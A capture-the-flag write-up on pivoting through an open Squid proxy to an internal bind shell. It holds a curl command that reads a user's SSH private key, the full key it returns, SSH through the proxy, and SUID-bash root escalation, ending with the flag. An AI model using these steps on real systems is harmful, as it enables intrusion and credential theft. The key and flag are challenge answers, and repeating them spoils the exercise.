Challenge:

![Challenge](images/1.challenge.PNG)

Visiting the page, we can see it is running squid proxy 3.5.27.

I did some research into fuzzing behind squid proxy and found this article by [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid).

From there, I found a repository for [Spose](https://github.com/aancw/spose).

After a slow process of adding blocks of ports to the script to not upset the rate limiting gods at Huntress, I finally found port 50000 was open.

![Port 50000](images/3.fuzzingbehindproxy.PNG)

Sending a curl to the address reveals that it is performing a directory listing on the other end.

![Proxy](images/4.checkingproxy.PNG)

One of the files that stands out here is the ```.docker-entrypoint.sh``` file.

From this, it looks we have a socat bind shell sitting on the other side on port 50000 and it's running as the user "user".  Let's abuse this knowledge and search for an SSH key.  A quick curl to ```curl -x http://challenge.ctf.games:32611 http://127.0.0.1:50000/home/user/.ssh/id_rsa``` gives us the following private key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
JauN0ipko/W2sAAAAJa2FsaUBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
```

I saved the file to a file named id_rsa and changed permissions to 600 to restrict the key or SSH throws a fit.  I then attempted to connect to the machine via SSH through the proxy.  The fine people at [Stack Overflow](https://stackoverflow.com/questions/19161960/connect-with-ssh-through-a-proxy) were very helpful here.

```ssh -i id_rsa user@127.0.0.1 -o "ProxyCommand=connect-proxy -H challenge.ctf.games:32611 %h %p"```

![SSH through proxy](images/7.sshthroughproxy.PNG)

After I connected, I did a quick search for SUID bits on binaries as that's one of the quickest ways to escalate and the challenge stated escalation was required.

```find / -perm -4000 2>/dev/null```

The bit is set on bash, so escalating to root is as simple as ```/bin/bash -p```

From here we check /root and find our flag.

![Flag](images/flag.PNG)

Flag: ```flag{c9bbd4888086111e9f632d4861c103f1}```